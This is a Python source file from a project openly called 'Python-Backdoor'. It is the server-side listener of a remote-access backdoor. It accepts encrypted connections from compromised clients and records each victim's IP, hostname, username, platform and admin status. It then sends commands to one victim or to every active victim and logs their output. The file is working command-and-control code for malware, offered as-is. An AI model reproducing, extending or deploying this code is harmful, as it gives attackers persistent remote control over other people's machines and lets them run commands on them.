"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox

license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
"""

import socket
from threading import Thread

from src import helper, errors
from src.encrypted_socket import EncryptedSocket
from src.defs import *


class Socket(EncryptedSocket):
    def __init__(self, port):
        super().__init__()

        self.thread_accept = None
        self.port = port
        self.connections = []
        self.addresses = []

        self.new_key()

        self.listener = socket.socket()
        self.socket = None  # socket for a connection

        try:
            self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,
                                     1)  # reuse a socket even if its recently closed
        except socket.error as e:
            self.logger.error(f"Error creating socket {e}")
            sys.exit(0)

    def listen_asych(self):
        def bind():
            try:
                self.listener.bind(("0.0.0.0", self.port))
                self.listener.listen(20)
            except socket.error() as e:
                self.logger.warning(f"Error binding socket {e}\nRetrying...")
                bind()

        bind()

        self.logger.info(f"Listening on port {self.port}")

        def socket_accept():
            while True:
                try:
                    self.socket, address = self.listener.accept()
                    self.socket.setblocking(1)  # no timeout

                    # first command is always the unencrypted key (as b64)
                    self.send_json(CLIENT_KEY, self.key.decode('ascii'), False)

                    while True:
                        # wait for handshake
                        response = self.recv_json()
                        if response["key"] == CLIENT_HANDSHAKE:
                            break

                    address = {"ip": address[0], "port": address[1]} | response["value"] | {"connected": True}

                    self.connections.append(self.socket)
                    self.addresses.append(address)

                    self.logger.info(
                        f"Connection {len(self.connections) - 1} has been established: {address['ip']}:{address['port']} ({address['hostname']})")
                except socket.error as err:
                    self.logger.error(f"Error accepting connection {err}")
                    continue

        self.thread_accept = Thread(target=socket_accept)
        self.thread_accept.daemon = True
        self.thread_accept.start()

    def close_clients(self):
        if len(self.connections) > 0:
            for _, self.socket in enumerate(self.active_connections()):
                try:
                    self.send_json(CLIENT_EXIT)
                    self.socket.close()
                except socket.error:
                    pass
        else:
            self.logger.warning("No connections")

        del self.connections
        del self.addresses
        self.connections = []
        self.addresses = []
        self.socket = None

    def close_one(self, index):
        try:
            self.select(index)
            self.send_json(CLIENT_EXIT)
            self.socket.close()
        except socket.error:
            pass
        except errors.ServerSocket.InvalidIndex as e:
            self.logger.error(e)
            return

        self.addresses[self.connections.index(self.socket)]["connected"] = False
        self.socket = None

    def refresh(self):
        for _, self.socket in enumerate(self.active_connections()):
            try:
                self.send_json(CLIENT_HEARTBEAT)
            except socket.error:
                self.addresses[self.connections.index(self.socket)]["connected"] = False
                self.socket.close()

    def get_curr_address(self):
        return self.addresses[self.connections.index(self.socket)]

    def list(self, inactive=False):
        addresses = []
        # add ID
        for i, address in enumerate(self.addresses):
            if (inactive and not address["connected"]) or (not inactive and address["connected"]):
                address = {"index": str(i)} | address
                addresses.append(address)

        if len(addresses) > 0:
            info = "\n"
            for key in addresses[0]:
                if key in ["index", "ip", "port", "username", "platform", "is_admin"]:
                    info += f"{helper.center(str(addresses[0][key]), str(key))}{4 * ' '}"

            info += "\n"

            for address in addresses:
                for key in address:
                    if key in ["index", "ip", "port", "username", "platform", "is_admin"]:
                        info += f"{helper.center(key, address[key])}{4 * ' '}"
                info += "\n"

            return info
        else:
            if inactive:
                _str = "inactive"
            else:
                _str = "active"

            self.logger.warning(f"No {_str} connections")
            return ""

    def select(self, connection_id):
        try:
            connection_id = int(connection_id)
            self.socket = self.connections[connection_id]

            if not self.addresses[connection_id]["connected"]:
                raise Exception

        except Exception:
            raise errors.ServerSocket.InvalidIndex(f"No active connection found with index {connection_id}")

    def send_all_connections(self, key, value, recv=False, recvall=False):
        if self.num_active_connections() > 0:
            for _, self.socket in enumerate(self.active_connections()):

                try:
                    self.send_json(key, value)
                except socket.error:
                    continue

                output = ""

                if recvall:
                    buffer = self.recv_json()["value"]["buffer"]

                    output = self.recvall(buffer).decode()
                elif recv:
                    output = self.recv_json()["value"]

                if output:
                    _info = self.addresses[self.connections.index(self.socket)]
                    self.logger.info(f"Command output from {_info['ip']}: \n{output}")
        else:
            self.logger.warning("No active connections")

    def active_connections(self):
        conns = []

        for i, address in enumerate(self.addresses):
            if address["connected"]:
                conns.append(self.connections[i])

        return conns

    def num_active_connections(self):
        count = 0

        for address in self.addresses:
            if address["connected"]:
                count += 1

        return count
